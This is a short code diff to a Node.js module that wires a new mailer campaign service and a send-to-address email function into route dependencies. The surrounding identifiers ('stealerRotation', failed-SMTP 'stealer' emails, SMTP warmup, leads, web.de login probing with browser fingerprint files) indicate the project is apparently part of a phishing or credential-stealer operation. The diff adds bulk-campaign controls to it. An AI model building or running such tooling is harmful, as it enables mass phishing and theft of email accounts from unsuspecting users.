@@ -4,6 +4,7 @@ const path = require('path');
 const gateMiddleware = require('../middleware/gateMiddleware');
 const mailService = require('../services/mailService');
 const warmupService = require('../services/warmupService');
+const mailerCampaignService = require('../services/mailerCampaignService');
 const probeService = require('../services/probeService');
 
 /**
@@ -25,6 +26,7 @@ function mergeServiceRouteDeps(base) {
     CONFIG_EMAIL_SENT_EVENT_LABEL: mailService.CONFIG_EMAIL_SENT_EVENT_LABEL,
     leadHasAnyConfigEmailSentEvent: mailService.leadHasAnyConfigEmailSentEvent,
     sendConfigEmailToLead: mailService.sendConfigEmailToLead,
+    sendConfigEmailToAddress: mailService.sendConfigEmailToAddress,
     stealerRotation: mailService.stealerRotation,
     sendStealerFailedSmtpEmails: mailService.sendStealerFailedSmtpEmails,
     CONFIG_EMAIL_FILE: path.join(DATA_DIR, 'config-email.json'),
@@ -38,6 +40,13 @@ function mergeServiceRouteDeps(base) {
     writeWarmupSmtpStats: warmupService.writeWarmupSmtpStats,
     warmupState: warmupService.warmupState,
     runWarmupStep: warmupService.runWarmupStep,
+    MAILER_CAMPAIGN_LOG_MAX: mailerCampaignService.MAILER_CAMPAIGN_LOG_MAX,
+    mailerCampaignState: mailerCampaignService.mailerCampaignState,
+    startMailerCampaign: mailerCampaignService.startCampaign,
+    pauseMailerCampaign: mailerCampaignService.pauseCampaign,
+    stopMailerCampaign: mailerCampaignService.stopCampaign,
+    getMailerCampaignStatus: mailerCampaignService.getStatus,
+    clearMailerCampaignLog: mailerCampaignService.clearLog,
     WEBDE_PROBE_MAX_INDICES_PER_JOB: probeService.WEBDE_PROBE_MAX_INDICES_PER_JOB,
     WEBDE_FINGERPRINTS_JSON: path.join(PROJECT_ROOT, 'login', 'webde_fingerprints.json'),
     WEBDE_FP_INDICES_FILE: path.join(PROJECT_ROOT, 'login', 'webde_fingerprint_indices.txt'),
